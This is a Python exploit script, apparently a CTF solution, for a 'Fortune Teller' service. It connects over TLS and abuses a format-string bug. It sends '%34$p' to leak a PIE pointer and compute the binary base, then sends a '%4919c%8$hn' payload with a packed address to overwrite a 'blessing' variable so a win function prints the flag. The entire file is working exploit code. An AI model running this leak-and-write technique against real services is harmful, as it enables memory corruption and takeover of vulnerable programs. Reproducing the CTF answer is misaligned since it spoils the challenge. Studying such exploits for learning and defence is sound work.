#!/usr/bin/env python3
# FortID Fortune Teller - minimal reproduction (fixed indices).
#
# Uses the simpler %34$p / %8$hn recipe. Works on the instance tested
# during the CTF; the adaptive solver (solve.py) is preferred for unknown
# instances because argument indices can vary between sessions.
#
# Usage:
#   python3 repro.py [host] [port]
import socket
import ssl
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else 'fortune-teller-<...>.inst15.ctf.fortid.com'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337


def connect(host, port):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    raw = socket.create_connection((host, port), timeout=12)
    return ctx.wrap_socket(raw, server_hostname=host)


def recv_until(sock, marker, timeout=8):
    data = b''
    sock.settimeout(timeout)
    try:
        while marker not in data:
            chunk = sock.recv(8192)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data


def main():
    s = connect(HOST, PORT)
    banner = recv_until(s, b'> ')
    if b'Fortune Teller' not in banner:
        print('banner mismatch:', banner[:200])

    # 1) leak PIE base via %34$p, a .fini_array pointer (offset 0x3d68)
    s.sendall(b'1\n')
    recv_until(s, b'> ')
    s.sendall(b'%34$p\n')
    out = recv_until(s, b'> ')
    if b'0x' not in out:
        print('NO LEAK')
        sys.exit(1)
    leak = int(out.split(b'0x')[1].split(b'\n')[0], 16)
    if (leak & 0xFFF) != 0xD68:
        print('leak low12 mismatch, expected 0xd68')
        sys.exit(1)
    base = leak - 0x3D68
    blessing = base + 0x404C
    print('leak=%#x base=%#x blessing=%#x' % (leak, base, blessing))

    # 2) write 0x1337 to blessing via %4919c%8$hn
    s.sendall(b'1\n')
    recv_until(s, b'> ')
    fmt = b'%4919c%8$hn'
    payload = fmt + b'\x00' * (16 - len(fmt)) + struct.pack('<Q', blessing)
    s.sendall(payload + b'\n')
    recv_until(s, b'> ', timeout=10)

    # 3) receive blessing, win() prints the flag
    s.sendall(b'2\n')
    resp = recv_until(s, b'> ', timeout=10)
    print('remote response:')
    print(resp.decode('utf-8', 'replace')[-800:])
    s.close()


if __name__ == '__main__':
    main()